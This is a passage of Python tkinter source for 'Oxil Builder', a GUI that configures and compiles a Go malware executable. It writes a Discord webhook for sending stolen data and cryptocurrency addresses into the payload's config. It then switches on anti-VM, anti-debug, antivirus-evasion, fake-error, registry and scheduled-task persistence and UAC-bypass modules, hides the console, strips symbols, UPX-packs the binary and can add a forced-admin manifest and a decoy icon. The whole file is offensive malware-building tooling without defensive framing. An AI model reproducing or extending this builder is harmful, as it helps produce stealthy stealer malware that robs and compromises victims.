                self.webhook_status.config(fg=COLORS["error"])
                self.webhook_valid = False
        else:
            self.webhook_status.config(fg=COLORS["text_secondary"])
            self.webhook_valid = False
            
    def validate_webhook(self):
        """Validates the webhook by sending a test message"""
        webhook_url = self.webhook_url.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL.")
            return
            
        if not (webhook_url.startswith("https://discord.com/api/webhooks/") or 
                webhook_url.startswith("https://discordapp.com/api/webhooks/")):
            messagebox.showerror("Error", "Invalid URL format. The URL must start with:\nhttps://discord.com/api/webhooks/")
            return
            
        self.log_webhook("Validating webhook...")
        
        # Send a test message
        test_embed = {
            "embeds": [{
                "title": "✅ Webhook Validation",
                "description": "This message confirms that the webhook works correctly with Oxil Builder.",
                "color": 15158332,  # #e74c3c (red)
                "footer": {
                    "text": "Oxil Builder - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }]
        }
        
        try:
            response = requests.post(webhook_url, json=test_embed, timeout=10)
            
            if response.status_code == 204:
                self.webhook_valid = True
                self.webhook_status.config(fg=COLORS["success"], text="✓")
                self.log_webhook("✅ Webhook validated successfully! Test message has been sent.")
                messagebox.showinfo("Success", "Webhook validated successfully!\nA test message has been sent to your Discord channel.")
            else:
                self.webhook_valid = False
                self.webhook_status.config(fg=COLORS["error"], text="✗")
                error_msg = f"HTTP Error {response.status_code}: {response.text[:100]}"
                self.log_webhook(f"❌ Validation error: {error_msg}")
                messagebox.showerror("Error", f"Webhook validation failed:\n{error_msg}")
        except requests.exceptions.RequestException as e:
            self.webhook_valid = False
            self.webhook_status.config(fg=COLORS["error"], text="✗")
            error_msg = f"Connection error: {str(e)}"
            self.log_webhook(f"❌ Connection error: {error_msg}")
            messagebox.showerror("Error", f"Unable to connect to webhook:\n{error_msg}")
        finally:
            self.webhook_status.config(text="●")
            
    def log_webhook(self, message):
        """Adds a message to the webhook log"""
        self.webhook_message.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.webhook_message.insert(tk.END, f"[{timestamp}] {message}\n")
        self.webhook_message.see(tk.END)
        self.webhook_message.config(state=tk.DISABLED)
        self.root.update()
    
    def log_action(self, message, level="info"):
        """Adds a message to the activity log"""
        if not hasattr(self, 'log_text') or not self.log_text:
            return
        
        self.log_text.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if level == "success":
            prefix = "✅"
            color_tag = "success"
        elif level == "error":
            prefix = "❌"
            color_tag = "error"
        elif level == "warning":
            prefix = "⚠️"
            color_tag = "warning"
        else:
            prefix = "ℹ️"
            color_tag = "info"
        
        log_message = f"[{timestamp}] {prefix} {message}\n"
        
        # Configure text tags for colors
        self.log_text.tag_config("success", foreground=COLORS["success"])
        self.log_text.tag_config("error", foreground=COLORS["error"])
        self.log_text.tag_config("warning", foreground=COLORS["warning"])
        self.log_text.tag_config("info", foreground=COLORS["text_primary"])
        
        start_pos = self.log_text.index(tk.END + "-1c")
        self.log_text.insert(tk.END, log_message)
        end_pos = self.log_text.index(tk.END + "-1c")
        self.log_text.tag_add(color_tag, start_pos, end_pos)
        
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update()
        
    # ============================================
    # Methods for modifying main.go
    # ============================================
    
    def backup_main_go(self):
        """Creates a backup of main.go"""
        if not os.path.exists(MAIN_GO_FILE):
            messagebox.showerror("Error", f"{MAIN_GO_FILE} not found.")
            return
            
        backup_file = MAIN_GO_FILE + BACKUP_SUFFIX
        try:
            shutil.copy2(MAIN_GO_FILE, backup_file)
            messagebox.showinfo("Success", f"Backup created: {backup_file}")
        except Exception as e:
            messagebox.showerror("Error", f"Unable to create backup:\n{str(e)}")
            
    def restore_main_go(self):
        """Restores main.go from backup"""
        backup_file = MAIN_GO_FILE + BACKUP_SUFFIX
        if not os.path.exists(backup_file):
            messagebox.showerror("Error", f"Backup not found: {backup_file}")
            return
            
        if messagebox.askyesno("Confirmation", f"Restore {backup_file} to {MAIN_GO_FILE}?"):
            try:
                shutil.copy2(backup_file, MAIN_GO_FILE)
                self.original_content = None
                self.load_original_main_go()
                self.main_go_modified = False
                messagebox.showinfo("Success", f"{MAIN_GO_FILE} restored from backup.")
            except Exception as e:
                messagebox.showerror("Error", f"Unable to restore:\n{str(e)}")
    
    def modify_main_go(self):
        """Modifies main.go with configured values (robust method)"""
        if not os.path.exists(MAIN_GO_FILE):
            raise FileNotFoundError(f"{MAIN_GO_FILE} not found.")
            
        # Load original content if not already done
        if self.original_content is None:
            self.load_original_main_go()
        
        # Create automatic backup before first modification
        backup_file = MAIN_GO_FILE + BACKUP_SUFFIX
        if not os.path.exists(backup_file) and self.original_content:
            try:
                with open(backup_file, 'w', encoding='utf-8') as f:
                    f.write(self.original_content)
            except Exception:
                pass  # If backup fails, continue anyway
            
        # Read current file
        try:
            with open(MAIN_GO_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
        except Exception as e:
            raise IOError(f"Unable to read {MAIN_GO_FILE}: {str(e)}")
            
        original_content = content
        
        # Modify webhook (robust pattern)
        webhook_url = self.webhook_url.get().strip()
        if webhook_url:
            # Properly escape for Go (backslash and quotes)
            escaped_webhook = webhook_url.replace('\\', '\\\\').replace('"', '\\"')
            # Pattern: "webhook": "" ou "webhook": "ancienne_url"
            pattern = r'("webhook"):\s*"[^"]*"'
            replacement = f'\\1: "{escaped_webhook}"'
            content = re.sub(pattern, replacement, content)
        
        # Modify crypto addresses (robust pattern)
        for crypto in CRYPTOS:
            address = self.crypto_addresses[crypto].get().strip()
            # Properly escape
            escaped_address = address.replace('\\', '\\\\').replace('"', '\\"')
            # Pattern: "BTC": "" ou "BTC": "ancienne_adresse"
            pattern = f'("{crypto}"):\\s*"[^"]*"'
            replacement = f'\\1: "{escaped_address}"'
            content = re.sub(pattern, replacement, content)
        
        # Get all options
        enable_antivm = self.enable_antivm.get()
        enable_fakeerror = self.enable_fakeerror.get()
        enable_antidebug = self.enable_antidebug.get()
        enable_antivirus = self.enable_antivirus.get()
        persistence_startup = self.persistence_startup.get()  # Registry HKCU
        persistence_admin = self.persistence_admin.get()  # Registry HKLM (admin)
        persistence_task = self.persistence_task.get()  # Task Scheduler
        elevation_mode = self.elevation_mode.get()  # 0=none, 1=uac bypass, 2=force admin
        
        # Utility function to comment/uncomment a line
        # Preserves original indentation (tabs or spaces)
        def toggle_line(line, pattern, enable, comment_suffix="Disabled by builder"):
            if re.match(pattern, line):
                # Extract original indentation prefix (preserves tabs/spaces)
                indent_match = re.match(r'^(\s*)', line)
                indent_prefix = indent_match.group(1) if indent_match else ''
                stripped = line.strip()
                if enable:
                    # Uncomment if necessary
                    if stripped.startswith('//'):
                        # Remove comment
                        uncommented = re.sub(r'^//\s*', '', stripped)
                        # Remove "Disabled by builder" suffix if present
                        uncommented = re.sub(r'\s*//\s*Disabled by builder$', '', uncommented)
                        return indent_prefix + uncommented, True
                    return line, True
                else:
                    # Comment if necessary
                    if not stripped.startswith('//'):
                        return f"{indent_prefix}// {stripped} // {comment_suffix}", True
                    return line, True
            return line, False
        
        lines = content.split('\n')
        modified_lines = []
        
        for i, line in enumerate(lines):
            new_line = line
            matched = False
            
            # antivm.Run()
            new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+antivm\.Run\(\)', enable_antivm)
            if not matched:
                # fakeerror.Run()
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+fakeerror\.Run\(\)', enable_fakeerror)
            if not matched:
                # antidebug.Run()
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+antidebug\.Run\(\)', enable_antidebug)
            if not matched:
                # antivirus.Run()
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+antivirus\.Run\(\)', enable_antivirus)
            if not matched:
                # startup.Run() - activate if persistence_startup is enabled
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+startup\.Run\(\)', persistence_startup)
            if not matched:
                # adminpersistence.Run() - activate if persistence_admin is enabled
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+adminpersistence\.Run\(\)', persistence_admin)
            if not matched:
                # taskpersistence.Run() - activate if persistence_task is enabled
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?go\s+taskpersistence\.Run\(\)', persistence_task)
            if not matched:
                # uacbypass.Run() - activate only if elevation_mode == 1
                new_line, matched = toggle_line(new_line, r'^\s*(//\s*)?uacbypass\.Run\(\)', elevation_mode == 1)
            
            # Ignorer les commentaires "Lancer antivm..."
            if re.match(r'^\s*//\s*Lancer\s+antivm', line):
                if enable_antivm:
                    modified_lines.append(line)
                continue
                
            modified_lines.append(new_line)
        
        content = '\n'.join(modified_lines)
        
        # Check if modifications were made
        if content == original_content:
            return False  # No modifications
        
        # Basic Go syntax check (verify file is not completely broken)
        if 'CONFIG := map[string]interface{}' not in content:
            raise ValueError("The CONFIG structure appears to be corrupted. Restoration recommended.")
        
        # Write modified file
        try:
            with open(MAIN_GO_FILE, 'w', encoding='utf-8') as f:
                f.write(content)
            self.main_go_modified = True
            return True
        except Exception as e:
            raise IOError(f"Unable to write to {MAIN_GO_FILE}: {str(e)}")
        
    # ============================================
    # Compilation methods
    # ============================================
    
    def compile_go(self):
        """Compiles the Go project"""
        output_name = self.output_name.get().strip() or "oxil.exe"
        if not output_name.endswith('.exe'):
            output_name += '.exe'
            
        # Construire la commande go build
        cmd = ["go", "build"]
        
        # Ajouter ldflags si activé
        if self.use_ldflags.get():
            if self.hide_console.get():
                cmd.extend(["-ldflags", '-s -w -H=windowsgui'])
            else:
                cmd.extend(["-ldflags", '-s -w'])
        elif self.hide_console.get():
            cmd.extend(["-ldflags", '-H=windowsgui'])
            
        # Nom du fichier de sortie
        cmd.extend(["-o", output_name])
        
        # Handle admin manifest and/or icon before compilation
        rsrc_syso_path = os.path.join(os.getcwd(), "rsrc.syso")
        manifest_path = None
        icon_path = self.icon_path.get().strip()
        need_rsrc = False
        
        # Create admin manifest if necessary
        if self.elevation_mode.get() == 2:  # Force Admin
            self.log_compile("🛡️ Force Admin mode: creating UAC manifest...\n")
            manifest_path = self.create_admin_manifest()
            if manifest_path:
                need_rsrc = True
        
        # Prepare rsrc if we have a manifest or icon
        if need_rsrc or (icon_path and os.path.exists(icon_path)):
            try:
                # Vérifier si rsrc est installé
                subprocess.run(["rsrc", "-version"], capture_output=True, check=True, timeout=5)
                
                rsrc_cmd = ["rsrc"]
                if manifest_path:
                    rsrc_cmd.extend(["-manifest", manifest_path])
                if icon_path and os.path.exists(icon_path):
                    rsrc_cmd.extend(["-ico", icon_path])
                rsrc_cmd.extend(["-o", rsrc_syso_path])
                
                self.log_compile(f"Creating Windows resources: {' '.join(rsrc_cmd)}\n")
                rsrc_process = subprocess.run(rsrc_cmd, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                
                if rsrc_process.returncode == 0:
                    self.log_compile("✅ Windows resources created (rsrc.syso)\n")
                else:
                    self.log_compile(f"⚠️ rsrc error: {rsrc_process.stderr}\n")
                    
            except (FileNotFoundError, subprocess.TimeoutExpired):
                self.log_compile("\n⚠️ The 'rsrc' tool is not installed.\n")
                self.log_compile("For admin manifest and icons, install rsrc:\n")
                self.log_compile("  go install github.com/akavel/rsrc@latest\n")
        
        self.log_compile(f"Command: {' '.join(cmd)}\n")
        self.log_compile("Compiling...\n")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='ignore',
                cwd=os.getcwd()
            )
            
            # Read output in real time
            for line in process.stdout:
                self.log_compile(line)
                
            process.wait()
            
            # Clean up temporary files
            for temp_file in [rsrc_syso_path, manifest_path]:
                if temp_file and os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except:
                        pass
            
            if process.returncode == 0:
                self.log_compile("\n✅ Compilation successful!\n")
                if os.path.exists(output_name):
                    file_size = os.path.getsize(output_name)
                    self.log_compile(f"File created: {output_name} ({file_size / 1024 / 1024:.2f} MB)\n")
                    
                    # UPX compression if enabled
                    if self.use_upx.get():
                        self.compress_with_upx(output_name)
                return True
            else:
                self.log_compile(f"\n❌ Compilation error (code: {process.returncode})\n")
                return False
        except FileNotFoundError:
            self.log_compile("\n❌ Error: Go is not installed or not in PATH.\n")
            return False
        except Exception as e:
            self.log_compile(f"\n❌ Error: {str(e)}\n")
            return False
            
    def create_admin_manifest(self):
        """Creates a Windows manifest that requests administrator privileges"""
        manifest_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="1.0.0.0" processorArchitecture="*" name="oxil" type="win32"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>'''
        manifest_file = os.path.join(os.getcwd(), "admin.manifest")
        try:
            with open(manifest_file, 'w', encoding='utf-8') as f:
                f.write(manifest_content)
            return manifest_file
        except Exception as e:
            self.log_compile(f"⚠️ Unable to create admin manifest: {str(e)}\n")
            return None
    
    def apply_icon(self, exe_path, icon_path):
        """Applies an icon to the executable using rsrc or goversioninfo"""
        self.log_compile(f"\nApplying icon: {os.path.basename(icon_path)}\n")
        
        try:
            # Method 1: Try with rsrc (more modern)
            try:
                # Check if rsrc is installed
                subprocess.run(["rsrc", "-version"], capture_output=True, check=True, timeout=5)
                
                manifest_path = os.path.join(os.getcwd(), "rsrc.syso")
                
                # Use rsrc to generate .syso file with icon
                cmd = ["rsrc", "-ico", icon_path, "-o", manifest_path]
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding='utf-8',
                    errors='ignore'
                )
                
                for line in process.stdout:
                    self.log_compile(line)
                
                process.wait()
                
                if process.returncode == 0 and os.path.exists(manifest_path):
                    # Recompile with .syso file
                    self.log_compile("Recompiling with icon...\n")
                    
                    cmd = ["go", "build"]
                    if self.use_ldflags.get():
                        if self.hide_console.get():
                            cmd.extend(["-ldflags", '-s -w -H=windowsgui'])
                        else:
                            cmd.extend(["-ldflags", '-s -w'])
                    elif self.hide_console.get():
                        cmd.extend(["-ldflags", '-H=windowsgui'])
                    cmd.extend(["-o", exe_path])
                    
                    rebuild_process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        encoding='utf-8',
                        errors='ignore',
                        cwd=os.getcwd()
                    )
                    
                    for line in rebuild_process.stdout:
                        self.log_compile(line)
                    
                    rebuild_process.wait()
                    
                    # Clean up .syso file
                    try:
                        if os.path.exists(manifest_path):
                            os.remove(manifest_path)
                    except:
                        pass
                    
                    if rebuild_process.returncode == 0:
                        self.log_compile("✅ Icon applied successfully!\n")
                    else:
                        self.log_compile("⚠️ Failed to recompile with icon.\n")
                else:
                    self.log_compile("⚠️ Failed to generate rsrc.syso file.\n")
                    
            except (FileNotFoundError, subprocess.TimeoutExpired):
                # rsrc is not installed, try Resource Hacker or indicate how to install
                self.log_compile("\n⚠️ The 'rsrc' tool is not installed.\n")
                self.log_compile("To apply an icon, install rsrc:\n")
                self.log_compile("  go install github.com/akavel/rsrc@latest\n")
                self.log_compile("Or use Resource Hacker to apply the icon manually.\n")
                self.log_compile(f"Icon: {icon_path}\n")
                self.log_compile(f"Executable: {exe_path}\n")
                
        except Exception as e:
            self.log_compile(f"\n⚠️ Error applying icon: {str(e)}\n")
            self.log_compile("Executable was created without icon.\n")
    
    def compress_with_upx(self, filename):
        """Compresses the file with UPX"""
        self.log_compile("\nUPX compression in progress...\n")
        
        try:
            # Check if UPX is available
            subprocess.run(["upx", "--version"], capture_output=True, check=True, timeout=5)
            
            cmd = ["upx", "--ultra-brute", filename]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            
            for line in process.stdout:
                self.log_compile(line)
                
            process.wait()
            
            if process.returncode == 0 and os.path.exists(filename):
                file_size = os.path.getsize(filename)
                self.log_compile(f"\n✅ Compression successful! Final size: {file_size / 1024 / 1024:.2f} MB\n")
            else:
                self.log_compile("\n⚠️ UPX compression failed, but file is still available.\n")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            self.log_compile("\n⚠️ UPX is not installed or not in PATH. Compression ignored.\n")
        except Exception as e:
            self.log_compile(f"\n⚠️ UPX error: {str(e)}\n")
    
    def log_compile(self, message):
        """Adds a message to the compilation log"""
        self.compile_log.config(state=tk.NORMAL)
        self.compile_log.insert(tk.END, message)
        self.compile_log.see(tk.END)
        self.compile_log.config(state=tk.DISABLED)
        self.root.update()
        
    # ============================================
    # Complete build method
    # ============================================
    
    def build_project(self):
        """Builds the complete project"""
        # Preliminary validation
        webhook = self.webhook_url.get().strip()
        if not webhook:
            if not messagebox.askyesno(
                "Confirmation",
                "No webhook has been configured. Continue anyway?"
            ):
                return
                
        # Check main.go
        if not os.path.exists(MAIN_GO_FILE):
            messagebox.showerror("Error", f"{MAIN_GO_FILE} not found.\nMake sure to run the builder from the project root directory.")
            return
            
        # Confirmation
        if not messagebox.askyesno("Confirmation", "Do you want to build the project with the current settings?"):
            return
            
        self.update_status("● Building in progress...")
        self.build_btn.config(state=tk.DISABLED)
        
        # Execute in a thread to avoid blocking the interface
        thread = threading.Thread(target=self._build_thread)
        thread.daemon = True
        thread.start()
        
    def _build_thread(self):
        """Build thread (background execution)"""
        try:
            # 1. Modify main.go
            self.log_compile("=" * 60 + "\n")
            self.log_compile("STEP 1: Modifying main.go\n")
            self.log_compile("=" * 60 + "\n")
            
            try:
                modified = self.modify_main_go()
                if modified:
                    self.log_compile("✅ main.go modified successfully.\n")
                else:
                    self.log_compile("ℹ️ No modifications needed in main.go.\n")
            except Exception as e:
                error_msg = f"Error modifying main.go: {str(e)}"
                self.log_compile(f"❌ {error_msg}\n")
                self.root.after(0, lambda: messagebox.showerror("Error", f"Unable to modify main.go:\n{str(e)}"))
                return
                
            # 2. Compile
            self.log_compile("\n" + "=" * 60 + "\n")
            self.log_compile("STEP 2: Go Compilation\n")
            self.log_compile("=" * 60 + "\n")
            
            success = self.compile_go()
            
            # 3. Final result
            if success:
                self.root.after(0, lambda: self.update_status("● ✅ Build successful!"))
                self.root.after(0, lambda: messagebox.showinfo(
                    "Success",
                    f"Build successful!\nFile: {self.output_name.get().strip() or 'oxil.exe'}"
                ))
            else:
                self.root.after(0, lambda: self.update_status("● ❌ Compilation error"))
                self.root.after(0, lambda: messagebox.showerror(
                    "Error",
                    "Compilation failed. Check the log for more details."
                ))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Unexpected error:\n{str(e)}"))
        finally:
            self.root.after(0, lambda: self.build_btn.config(state=tk.NORMAL))
            
    # ============================================
    # Configuration management methods
    # ============================================
    
    def save_config(self):
        """Saves the current configuration"""
        config = {
            "webhook": self.webhook_url.get(),
            "cryptos": {crypto: self.crypto_addresses[crypto].get() for crypto in CRYPTOS},
            "compile_options": {
                "hide_console": self.hide_console.get(),
                "use_upx": self.use_upx.get(),
                "output_name": self.output_name.get(),
                "use_ldflags": self.use_ldflags.get(),
                "enable_antivm": self.enable_antivm.get(),
                "enable_fakeerror": self.enable_fakeerror.get(),
                "enable_antidebug": self.enable_antidebug.get(),
                "enable_antivirus": self.enable_antivirus.get(),
                "persistence_startup": self.persistence_startup.get(),
                "persistence_admin": self.persistence_admin.get(),
                "persistence_task": self.persistence_task.get(),
                "elevation_mode": self.elevation_mode.get(),
                "icon_path": self.icon_path.get()
            },
            "last_updated": datetime.now().isoformat()
        }
        
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4, ensure_ascii=False)
            messagebox.showinfo("Success", f"Configuration saved to {CONFIG_FILE}")
        except Exception as e:
            messagebox.showerror("Error", f"Unable to save configuration:\n{str(e)}")
            
    def load_config(self):
        """Loads configuration from file"""
        if not os.path.exists(CONFIG_FILE):
            return
            
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                
            # Load values
            if "webhook" in config:
                self.webhook_url.set(config["webhook"])
                
            if "cryptos" in config:
                for crypto, address in config["cryptos"].items():
                    if crypto in self.crypto_addresses:
                        self.crypto_addresses[crypto].set(address)
                        
            if "compile_options" in config:
                opts = config["compile_options"]
                self.hide_console.set(opts.get("hide_console", False))
                self.use_upx.set(opts.get("use_upx", False))
                self.output_name.set(opts.get("output_name", "oxil.exe"))
                self.use_ldflags.set(opts.get("use_ldflags", True))
                self.enable_antivm.set(opts.get("enable_antivm", True))
                self.enable_fakeerror.set(opts.get("enable_fakeerror", True))
                self.enable_antidebug.set(opts.get("enable_antidebug", True))
                self.enable_antivirus.set(opts.get("enable_antivirus", True))
                self.persistence_startup.set(opts.get("persistence_startup", True))
                self.persistence_admin.set(opts.get("persistence_admin", False))
                self.persistence_task.set(opts.get("persistence_task", False))
                self.elevation_mode.set(opts.get("elevation_mode", 1))
                self.icon_path.set(opts.get("icon_path", ""))
                
            # Update interface
            self.on_webhook_change()
            # Update icon preview if loaded from config
            if self.icon_path.get():
                self.root.after(100, self.update_icon_preview)
        except Exception as e:
            print(f"Error loading configuration: {str(e)}")
            
    def load_config_dialog(self):
        """Loads configuration via dialog"""
        self.load_config()
        messagebox.showinfo("Success", "Configuration loaded from file.")
        
    def reset_config(self):
        """Resets configuration to default values"""
        if not messagebox.askyesno("Confirmation", "Do you really want to reset all values?"):
            return
            
        self.webhook_url.set("")
        for crypto in CRYPTOS:
            self.crypto_addresses[crypto].set("")
        self.hide_console.set(False)
        self.use_upx.set(False)
        self.output_name.set("oxil.exe")
        self.use_ldflags.set(True)
        self.enable_antivm.set(True)
        self.enable_fakeerror.set(True)
        self.enable_antidebug.set(True)
        self.enable_antivirus.set(True)
        self.persistence_startup.set(True)
        self.persistence_admin.set(False)
        self.persistence_task.set(False)
        self.elevation_mode.set(1)
        self.icon_path.set("")
        
        self.on_webhook_change()
        messagebox.showinfo("Success", "Configuration reset.")
        
    def clear_crypto(self):
        """Clears all crypto addresses"""
        if messagebox.askyesno("Confirmation", "Clear all crypto addresses?"):
            for crypto in CRYPTOS:
                self.crypto_addresses[crypto].set("")
    
    def browse_icon_file(self):
        """Opens a dialog to select a .ico file"""
        # Use resources/icons folder by default if it exists
        default_dir = os.path.join(os.getcwd(), "resources", "icons")
        if not os.path.exists(default_dir):
            default_dir = os.getcwd()
        
        # If oxil.ico exists in resources/icons, use it by default
        default_file = os.path.join(default_dir, "oxil.ico")
        initialfile = None
        if os.path.exists(default_file):
            initialfile = "oxil.ico"
        
        file_path = filedialog.askopenfilename(
            title="Select an icon",
            filetypes=[
                ("Icon files", "*.ico"),
                ("All files", "*.*")
            ],
            initialdir=default_dir,
            initialfile=initialfile
        )
        
        if file_path:
            # Verify it's a .ico file
            if not file_path.lower().endswith('.ico'):
                messagebox.showerror("Error", "The selected file is not a .ico file")
                return
            
            # Verify the file exists
            if not os.path.exists(file_path):
                messagebox.showerror("Error", "The selected file does not exist.")
                return
            
            self.icon_path.set(file_path)
            
    def clear_icon(self):
        """Clears the icon path"""
        if self.icon_path.get():
            if messagebox.askyesno("Confirmation", "Clear the icon path?"):
                self.icon_path.set("")
    
    def update_icon_in_entry(self):
        """Updates the icon displayed in the entry field"""
        icon_path = self.icon_path.get().strip()
        if icon_path and os.path.exists(icon_path):
            try:
                # Try to load icon and display it in field
                from PIL import Image, ImageTk
                img = Image.open(icon_path)
                # Resize for field (32x32 pixels - small icon in field)
                img = img.resize((32, 32), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.icon_entry_icon.config(image=photo, text="")
                self.icon_entry_icon.image = photo  # Keep a reference
            except ImportError:
                # PIL not available, display emoji
                self.icon_entry_icon.config(image="", text="📄")
            except Exception:
                # Error loading, display emoji
                self.icon_entry_icon.config(image="", text="❌")
        else:
            # No icon, display default emoji
            self.icon_entry_icon.config(image="", text="📄")
            if hasattr(self.icon_entry_icon, 'image'):
                del self.icon_entry_icon.image
    
    def update_icon_preview(self):
        """Updates the icon preview (large preview)"""
        # Clear canvas
        self.icon_preview_canvas.delete("all")
        
        icon_path = self.icon_path.get().strip()
        if icon_path and os.path.exists(icon_path):
            try:
                # Try to load icon and display it at canvas size
                from PIL import Image, ImageTk
                img = Image.open(icon_path)
                # Resize to completely fill canvas (320x320 pixels)
                img = img.resize((self.icon_preview_size, self.icon_preview_size), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                
                # Display image at center of canvas
                self.icon_preview_canvas.create_image(
                    self.icon_preview_size // 2,
                    self.icon_preview_size // 2,
                    image=photo,
                    anchor=tk.CENTER
                )
                self.icon_preview_canvas.image = photo  # Keep a reference to avoid garbage collection
            except ImportError:
                # PIL not available, display a message
                self.icon_preview_canvas.create_text(
                    self.icon_preview_size // 2,
                    self.icon_preview_size // 2,
                    text="⚠️\nInstall Pillow\nto preview",
                    fill=COLORS["text_secondary"],
                    font=("Segoe UI", 12),
                    justify=tk.CENTER
                )
            except Exception as e:
                # Error loading, display message
                self.icon_preview_canvas.create_text(
                    self.icon_preview_size // 2,
                    self.icon_preview_size // 2,
                    text="Error\nloading",
                    fill=COLORS["error"],
                    font=("Segoe UI", 12),
                    justify=tk.CENTER
                )
        else:
            # No icon, display default text
            self.icon_preview_canvas.create_text(
                self.icon_preview_size // 2,
                self.icon_preview_size // 2,
                text="No\nicon",
                fill=COLORS["text_secondary"],
                font=("Segoe UI", 12),
                justify=tk.CENTER
            )
            if hasattr(self.icon_preview_canvas, 'image'):
                del self.icon_preview_canvas.image
        
        # Also update icon in entry field
        self.update_icon_in_entry()
                
    def update_status(self, message):
        """Updates the status bar"""
        self.status_bar.config(text=message)


def main():
    """Main entry point"""
    # Check Python
    if sys.version_info < (3, 8):
        print("ERROR: Python 3.8+ required.")
        print(f"Current version: {sys.version}")
        input("Press Enter to exit...")
        sys.exit(1)
    
    # Check tkinter
    try:
        import tkinter
    except ImportError:
        print("ERROR: tkinter is not available.")
        print("tkinter is usually included with Python. Check your Python installation.")
        print("To install: python -m pip install tk")
        input("Press Enter to exit...")
        sys.exit(1)
        
    # Create main window
    try:
        root = tk.Tk()
        app = OxilBuilder(root)
        
        # Launch application
        root.mainloop()
    except KeyboardInterrupt:
        print("\nBuilder stopped.")
    except Exception as e:
        print(f"\nERROR: An error occurred while launching the GUI:")
        print(f"{type(e).__name__}: {str(e)}")
        import traceback
        traceback.print_exc()
        input("\nPress Enter to exit...")


if __name__ == "__main__":
    main()
